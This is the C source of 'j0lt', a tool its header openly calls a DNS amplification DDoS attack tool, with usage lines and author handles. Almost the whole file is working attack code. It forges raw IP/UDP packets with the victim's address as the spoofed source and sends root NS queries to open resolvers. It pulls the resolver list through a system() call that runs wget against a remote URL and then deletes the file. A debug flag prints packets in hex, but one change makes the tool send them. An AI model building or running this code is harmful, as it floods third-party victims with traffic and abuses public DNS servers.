/* PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE.
 *      _________  .__   __
 *     |__\   _  \ |  |_/  |_
 *     |  /  /_\  \|  |\   __\
 *     |  \  \_/   \  |_|  |                               2021
 * /\__|  |\_____  /____/__|         the-scientist:spl0its-r-us
 * \______|      \/              ddos amplification attack tool
 * ------------------------------------------------------------
 * > This is unpublished proprietary source code of spl0its-r-us
 * the-scientist
 * tofu@rootstorm.com
 * ------------------------------------------------------------
 * > Knowledge:
 * https://datatracker.ietf.org/doc/html/rfc1700    (NUMBERS)
 * https://datatracker.ietf.org/doc/html/rfc1035    (DNS)
 * https://datatracker.ietf.org/doc/html/rfc1071    (CHECKSUM)
 * https://www.rfc-editor.org/rfc/rfc768.html       (UDP)
 * https://www.rfc-editor.org/rfc/rfc760            (IP)
 * ------------------------------------------------------------
 * > Usage: sudo ./j0lt <target> <port> <num-packets>
 * (the-scientist㉿rs)-[~/0day]$ gcc j0lt.c -o j0lt
 * (the-scientist㉿rs)-[~/0day]$ unshare -rn
 * (the-scientist㉿rs)-[~/0day]# ./j0lt 127.0.0.1 80 1337
 * ------------------------------------------------------------
 * > What is DNS a amplification attack:
 * A type of DDoS attack in which attackers use publicly
 * accessible open DNS servers to flood a target with DNS
 * response traffic. An attacker sends a DNS lookup request
 * to an open DNS server with the source address spoofed to
 * be the target’s address. When the DNS server sends the
 * record response, it is sent to the target instead.
 * ------------------------------------------------------------
 * > The only sane place left on the internet:
 * irc.efnet.org #c
 */

const char* g_ansi = {
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒                   ▒░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░                 ░░░░░░░░░░░░░░░░░░░░░░ ░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓ ░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓▓░░░░ ░░░░░▒▒░   ▓▓▓▓▓▓▓▓   \n"
    "░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░          ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ░\n"
    "░░░░░▓▓▓▓▓▓▓▓▓▓ ░░░░░░  ▓▓▓            ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░\n"
    "░░░░▒▓▓▓▓▓▓▓▓▓▓ ░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ░░\n"
    "░░░░▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓     ▓▓▓▓▓▓▓▓         ▓░░\n"
    "░░░░   ▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
    "░░░░░░░▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓░ ░░░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
    "░░░░░░░ ▓▓▓ ▓▓▓▓▓▓▓▓           ▓▓▓▓ ▓▓▓▓▓▓▓▓▓  ░░░░░░░░▓▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓▓             ▓▓▓ ▓▓▓▓▓▓▓▓  ░░░░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓              ▓▓ ▓▓▓▓▓▓▓▓▓▓▓  ▓░░░░░░ ▓▓▓▓▓▓▓▓ ▓░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓░▓▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
    "▓▓▓░░ ▓▓▓▓▓ ▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▒░░▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓ ▓▓                     ▓▓▓    ▓▓▓▓▓▓▓   ░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓▓  ░░        ░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓   ░░░░░░░░░░░░░░░░░▒   ░     ░░░░░░░░░\n"
    "              ░  ▓            ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░\n"
    "░░▓      ░░░░░░░░           ▓▓ ░    ░░░░░    ░░░░░    ░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░                ░░░░░░░                   ░░░░░            \n"
    "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      \n"
    "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target IPv4 (spoof)    \n"
    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -n <num>        : num UDP packets to send\n"
    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     \n"
    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com\n"
};

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h> 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <arpa/nameser.h> 
#include <arpa/nameser_compat.h>

#include <netinet/ip.h>
#include <netinet/udp.h>

#include <netdb.h>
#include <unistd.h>

typedef struct __attribute__((packed, aligned(1))) {
    uint32_t sourceaddr;
    uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN 
    uint32_t zero : 8;
    uint32_t protocol : 8;
    uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint32_t udplen : 16;
    uint32_t protocol : 8;
    uint32_t zero : 8;
#endif
} PSEUDOHDR;

#define DEFINE_INSERT_FN(typename, datatype)           \
        bool insert_##typename                         \
        (uint8_t** buf, size_t* buflen, datatype data) \
    {                                                  \
        uint64_t msb_mask, lsb_mask,                   \
            bigendian_data, lsb, msb;                  \
        size_t byte_pos, nbits;                        \
                                                       \
        if (*buflen < 1) {                             \
            return false;                              \
        }                                              \
                                                       \
        nbits = sizeof(data) << 3;                     \
        bigendian_data = 0ULL;                         \
        byte_pos = (nbits / 8) - 1;                    \
        lsb_mask = 0xffULL;                            \
        msb_mask = lsb_mask << nbits - 8;              \
                                                       \
        byte_pos = byte_pos << 3;                      \
        for (int i = nbits >> 4; i != 0; i--) {        \
            lsb = (data & lsb_mask);                   \
            msb = (data & msb_mask);                   \
            lsb <<= byte_pos;                          \
            msb >>= byte_pos;                          \
            bigendian_data |= lsb | msb;               \
            msb_mask >>= 8;                            \
            lsb_mask <<= 8;                            \
            byte_pos -= (2 << 3);                      \
        }                                              \
                                                       \
        data = bigendian_data == 0 ?                   \
            data : bigendian_data;                     \
        for (int i = sizeof(data);                     \
             *buflen != -1 && i > 0; i--) {            \
            *(*buf)++ = (data & 0xff);                 \
            data >>= 8;                                \
            (*buflen)--;                               \
        }                                              \
                                                       \
        return data == 0;                              \
    }                                                  \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

// IP HEADER VALUES
#define     IP_IHL_MIN_J0LT 5
#define     IP_IHL_MAX_J0LT 15
#define     IP_TTL_J0LT 0x40
#define     IP_ID_J0LT 0xb00b
// FLAGS
#define     IP_RF_J0LT 0x8000 // reserved fragment flag
#define     IP_DF_J0LT 0x4000 // dont fragment flag
#define     IP_MF_J0LT 0x2000 // more fragments flag
#define     IP_OF_J0LT 0x0000 // no clue what 0000 is. 
// END FLAGS
#define     IP_VER_J0LT 4
// END IPHEADER VALUES 

// DNS HEADER VALUES 
#define     DNS_ID_J0LT 0x1337
#define     DNS_QR_J0LT 0 // query (0), response (1).
// OPCODE
#define     DNS_OPCODE_J0LT ns_o_query
// END OPCODE
#define     DNS_AA_J0LT 0 // Authoritative Answer
#define     DNS_TC_J0LT 0 // TrunCation
#define     DNS_RD_J0LT 1 // Recursion Desired 
#define     DNS_RA_J0LT 0 // Recursion Available
#define     DNS_Z_J0LT 0 // Reserved
#define     DNS_AD_J0LT 0 // dns sec
#define     DNS_CD_J0LT 0 // dns sec
// RCODE
#define     DNS_RCODE_J0LT ns_r_noerror
// END RCODE
#define     DNS_QDCOUNT_J0LT 0x0001 // num questions
#define     DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
#define     DNS_NSCOUNT_J0LT 0x0000 // num authority RRs 
#define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
// END HEADER VALUES

// START SYSTEM() AND READ() 
#define     MAXREAD_J0LT 0x30
#define     NCOMMANDS_J0LT 3
#define     COMMAND_PATH_J0LT 0
#define     COMMAND_RM_J0LT 1
#define     COMMAND_WGET_J0LT 2

const char* g_commands[ NCOMMANDS_J0LT ] = {
    "/tmp/resolv.txt",
    "rm /tmp/resolv.txt",
    "wget -O /tmp/resolv.txt https://raw.githubusercontent.com/thesc1entist/j0lt/main/j0lt-resolv.txt"
};
// END SYSTEM() AND READ() 

typedef struct iphdr IPHEADER;
typedef struct udphdr UDPHEADER;
typedef HEADER DNSHEADER;

bool
InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data);
bool
InsertIPHeader(uint8_t** buf, size_t* buflen, IPHEADER* header);
bool
InsertDNSHeader(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
bool
InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
void
PackDNSHeader(DNSHEADER* dnshdr);
void
PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten);
void
PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
bool
InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
uint16_t
CheckSum(const uint16_t* addr, size_t count);
bool
SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
void
PrintHex(void* data, size_t len);
size_t
ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
void
Red(void);
void
Green(void);
void
Reset(void);

#define DEBUG 1
int
main(int argc, char** argv)
{
    FILE* fptr;
    char payload[ NS_PACKETSZ ], lineptr[ MAXREAD_J0LT ];
    size_t szpayload, nread;
    uint32_t spoofip, resolvip;
    uint16_t spoofport, attacksz;

    // TODO add optargs
    if (argc != 4)
        goto fail_state;

    spoofip = inet_addr(argv[ 1 ]); // spoofed ip address to victim
    if (spoofip == 0)
        goto fail_state;

    spoofip = htonl(spoofip);

    errno = 0;
    spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0); // port to victim
    attacksz = ( uint16_t ) strtol(argv[ 3 ], NULL, 0); // size of attack.
    if (errno != 0)
        goto fail_state;

    system(g_commands[ COMMAND_WGET_J0LT ]); // grab resolv list
    fptr = fopen(g_commands[ COMMAND_PATH_J0LT ], "r");
    if (fptr == NULL)
        goto fail_state;

    Green( );
    printf("+ resolv list saved to %s\n", g_commands[ COMMAND_PATH_J0LT ]);
    Reset( );
    while (attacksz >= 1) {
        Green( );
        printf("+ current attack size %d \n", attacksz);
        Reset( );
        while (fgets(lineptr, MAXREAD_J0LT, fptr) != NULL) {
            if (lineptr[ 0 ] == '#')
                continue;
            nread = strlen(lineptr);
            lineptr[ nread - 1 ] = '\0';

            resolvip = inet_addr(lineptr);
            if (resolvip == 0)
                continue;
            resolvip = htonl(resolvip);

            szpayload = ForgeJ0ltPacket(payload, resolvip, spoofip, spoofport);
#if !DEBUG
            if (SendPayload(payload, resolvip, NS_DEFAULTPORT, szpayload) == false)
                goto fail_state;
#else 
            PrintHex(payload, szpayload);
#endif
        } // END INNER LOOP 
        attacksz--;
        rewind(fptr);
    } // END OUTER LOOP

    Red( );
    printf("- removing resolv list from %s\n", g_commands[ COMMAND_PATH_J0LT ]);
    Reset( );
    system(g_commands[ COMMAND_RM_J0LT ]); // remove resolv list

    fclose(fptr);

    return 0;
fail_state:
    printf("%s", g_ansi);
    perror("error");
    exit(EXIT_FAILURE);
} // END MAIN


size_t
ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
{
    const char* url = ".";  // . is for the biggest possible payload 
                            // Note: can be swapped for a list of urls
    uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
    uint8_t* curpos;
    size_t buflen, nwritten, szdatagram;
    bool status;

    UDPHEADER udpheader;
    DNSHEADER dnsheader;
    IPHEADER ipheader;
    PSEUDOHDR pseudoheader;

    buflen = NS_PACKETSZ;
    memset(pktbuf, 0, NS_PACKETSZ);

    curpos = pktbuf;
    status = true;
    PackDNSHeader(&dnsheader);
    status &= InsertDNSHeader(&curpos, &buflen, &dnsheader);
    status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_ns, ns_c_in);

    if (status == false)
        return 0;

    nwritten = NS_PACKETSZ - buflen;
    PackIPHeader(&ipheader, &pseudoheader, resolvip, spoofip, nwritten, sizeof(UDPHEADER));
    PackUDPHeader(&udpheader, &pseudoheader, spoofport, nwritten);

    memset(datagram, 0, NS_PACKETSZ);
    curpos = datagram;
    status &= InsertIPHeader(&curpos, &buflen, &ipheader);
    status &= InsertUDPHeader(&curpos, &buflen, &udpheader, &pseudoheader, pktbuf);
    if (status == false)
        return 0;

    szdatagram = buflen;
    InsertData(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
    nwritten = NS_PACKETSZ - buflen;

    memcpy(payload, datagram, nwritten);
    return nwritten;
}


void
PrintHex(void* data, size_t len)
{
    const uint8_t* d = ( const uint8_t* ) data;
    size_t i, j;
    for (j = 0, i = 0; i < len; i++) {
        if (i % 16 == 0) {
            printf("\n0x%.4x: ", j);
            j += 16;
        }
        if (i % 2 == 0)
            putchar(' ');
        printf("%.2x", d[ i ]);
    }
    putchar('\n');
}


bool
SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
{
    int raw_sockfd;
    ssize_t nread;
    struct sockaddr_in addr;

    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sockfd == -1)
        return false;

    addr.sin_family = AF_INET;
    addr.sin_port = uh_dport;
    addr.sin_addr.s_addr = daddr;

    nread = sendto(
            raw_sockfd,
            datagram,
            nwritten,
            0,
            ( const struct sockaddr* ) &addr,
            sizeof(addr)
    );

    close(raw_sockfd);

    return !(nread == -1 || nread != nwritten);
}


void
PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz)
{
    memset(iphdr, 0, sizeof(IPHEADER));
    iphdr->version = IP_VER_J0LT;
    iphdr->ihl = IP_IHL_MIN_J0LT;
    iphdr->tot_len = (iphdr->ihl << 2) + udpsz + nwritten;
    iphdr->id = IP_ID_J0LT;
    iphdr->frag_off = IP_OF_J0LT;
    iphdr->ttl = IP_TTL_J0LT;
    iphdr->protocol = getprotobyname("udp")->p_proto;
    iphdr->saddr = spoofip; // spoofed ip address to victim
    iphdr->daddr = resolvip; // open resvoler 
    memset(pseudohdr, 0, sizeof(PSEUDOHDR));
    pseudohdr->protocol = iphdr->protocol;
    pseudohdr->destaddr = iphdr->daddr;
    pseudohdr->sourceaddr = iphdr->saddr;
}


void
PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten)
{
    memset(udphdr, 0, sizeof(UDPHEADER));
    udphdr->uh_dport = NS_DEFAULTPORT; // nameserver port
    udphdr->uh_sport = spoofport;    // victim port
    udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);

    pseudohdr->udplen = sizeof(UDPHEADER);
}


void
PackDNSHeader(DNSHEADER* dnshdr)
{
    memset(dnshdr, 0, sizeof(DNSHEADER));
    dnshdr->id = DNS_ID_J0LT;
    dnshdr->rd = DNS_RD_J0LT;
    dnshdr->tc = DNS_TC_J0LT;
    dnshdr->aa = DNS_AA_J0LT;
    dnshdr->opcode = DNS_OPCODE_J0LT;
    dnshdr->qr = DNS_QR_J0LT;
    dnshdr->rcode = DNS_RCODE_J0LT;
    dnshdr->cd = DNS_CD_J0LT;
    dnshdr->ad = DNS_AD_J0LT;
    dnshdr->unused = DNS_Z_J0LT;
    dnshdr->ra = DNS_RA_J0LT;
    dnshdr->qdcount = DNS_QDCOUNT_J0LT;
    dnshdr->ancount = DNS_ANCOUNT_J0LT;
    dnshdr->nscount = DNS_NSCOUNT_J0LT;
    dnshdr->arcount = DNS_ARCOUNT_J0LT;
}


bool
InsertIPHeader(uint8_t** buf, size_t* buflen, IPHEADER* header)
{
    bool status;
    uint8_t* bufptr = *buf;
    uint8_t first_byte;

    status = true;
    first_byte = header->version << 4 | header->ihl;
    status &= insert_byte(buf, buflen, first_byte);
    status &= insert_byte(buf, buflen, header->tos);
    status &= insert_word(buf, buflen, header->tot_len);
    status &= insert_word(buf, buflen, header->id);
    status &= insert_word(buf, buflen, header->frag_off);
    status &= insert_byte(buf, buflen, header->ttl);
    status &= insert_byte(buf, buflen, header->protocol);
    status &= insert_word(buf, buflen, header->check);
    status &= insert_dword(buf, buflen, header->saddr);
    status &= insert_dword(buf, buflen, header->daddr);

    header->check = CheckSum(( const uint16_t* ) bufptr, ( size_t ) header->ihl << 2);
    *buf -= 0xa;
    *(*buf)++ = (header->check & 0xff00) >> 8;
    **buf = header->check & 0xff;
    *buf += 9;

    return status;
}


bool
InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data)
{
    bool status;
    size_t totalsz =
        sizeof(PSEUDOHDR) + header->uh_ulen;
    size_t datasz =
        abs(header->uh_ulen - sizeof(UDPHEADER));
    size_t udpsofar;
    uint8_t pseudo[ totalsz ];
    uint8_t* pseudoptr = pseudo;

    status = true;
    status &= insert_word(buf, buflen, header->uh_sport);
    status &= insert_word(buf, buflen, header->uh_dport);
    status &= insert_word(buf, buflen, header->uh_ulen);
    udpsofar = sizeof(UDPHEADER) - 2;

    memset(pseudo, 0, totalsz);
    insert_dword(&pseudoptr, &totalsz, pseudoheader->sourceaddr);
    insert_dword(&pseudoptr, &totalsz, pseudoheader->destaddr);
    insert_byte(&pseudoptr, &totalsz, pseudoheader->zero);
    insert_byte(&pseudoptr, &totalsz, pseudoheader->protocol);
    insert_word(&pseudoptr, &totalsz, pseudoheader->udplen);

    *buf -= udpsofar;
    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, *buf, udpsofar + 2);
    *buf += udpsofar;
    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, data, datasz);
    header->uh_sum =
        CheckSum(( uint16_t* ) pseudo,
        sizeof(PSEUDOHDR) + header->uh_ulen
        );

    header->uh_sum -= datasz; // wtf... 
    status &= insert_word(buf, buflen, header->uh_sum);

    return status;
}


bool
InsertDNSHeader(uint8_t** buf, size_t* buflen, const HEADER* header)
{
    bool status;
    uint8_t third_byte, fourth_byte;

    third_byte = (
        header->rd |
        header->tc << 1 |
        header->aa << 2 |
        header->opcode << 3 |
        header->qr << 7
    );

    fourth_byte = (
        header->rcode |
        header->cd << 4 |
        header->ad << 5 |
        header->unused << 6 |
        header->ra << 7
    );

    status = true;
    status &= insert_word(buf, buflen, header->id);

    status &= insert_byte(buf, buflen, third_byte);
    status &= insert_byte(buf, buflen, fourth_byte);

    status &= insert_word(buf, buflen, header->qdcount);
    status &= insert_word(buf, buflen, header->ancount);
    status &= insert_word(buf, buflen, header->nscount);
    status &= insert_word(buf, buflen, header->arcount);

    return status;
}


bool
InsertDNSQuestion(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
{
    const char* token;
    char* saveptr, qname[ NS_PACKETSZ ];
    size_t srclen, domainlen, dif;
    bool status;

    dif = *buflen;
    domainlen = strlen(domain) + 1;
    if (domainlen > NS_PACKETSZ - 1)
        return false;

    memcpy(qname, domain, domainlen);
    if (qname[ 0 ] != '.') {
        token = strtok_r(qname, ".", &saveptr);
        if (token == NULL) {
            return false;
        }
        while (token != NULL) {
            srclen = strlen(token);
            insert_byte(( uint8_t** ) buf, buflen, srclen);
            InsertData(buf, buflen, token, srclen);
            token = strtok_r(NULL, ".", &saveptr);
        }
    }

    status = true;
    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
    status &= insert_word(( uint8_t** ) buf, buflen, query_class);

    dif -= *buflen;
    if (dif % 2 != 0) { // pad
        status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
    }

    return status;
}


bool
InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
{
    if (*dst_buflen < src_len)
        return false;

    memcpy(*dst, src, src_len);
    *dst += src_len;
    *dst_buflen -= src_len;

    return true;
}


uint16_t
CheckSum(const uint16_t* addr, size_t count)
{
    register uint64_t sum = 0;

    while (count > 1) {
        sum += *( uint16_t* ) addr++;
        count -= 2;
    }

    if (count > 0)
        sum += *( uint8_t* ) addr;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
}

void
Red(void)
{
    printf("\033[1;31m");
}

void
Green(void)
{
    printf("\033[0;32m");
}

void
Reset(void)
{
    printf("\033[0m");
}
